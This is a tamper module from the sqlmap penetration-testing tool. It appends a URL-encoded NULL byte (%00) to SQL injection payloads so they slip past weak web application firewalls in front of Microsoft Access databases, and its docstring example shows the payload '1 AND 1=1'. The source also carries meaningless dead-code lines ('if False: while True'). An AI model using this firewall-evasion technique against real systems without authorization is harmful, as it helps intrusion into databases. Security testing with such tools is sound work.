"""
Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
import os
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOWEST

def dependencies():
    if False:
        while True:
            i = 10
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split('.')[0], DBMS.ACCESS))

def tamper(payload, **kwargs):
    if False:
        return 10
    "\n    Appends (Access) NULL byte character (%00) at the end of payload\n\n    Requirement:\n        * Microsoft Access\n\n    Notes:\n        * Useful to bypass weak web application firewalls when the back-end\n          database management system is Microsoft Access - further uses are\n          also possible\n\n    Reference: http://projects.webappsec.org/w/page/13246949/Null-Byte-Injection\n\n    >>> tamper('1 AND 1=1')\n    '1 AND 1=1%00'\n    "
    return '%s%%00' % payload if payload else payload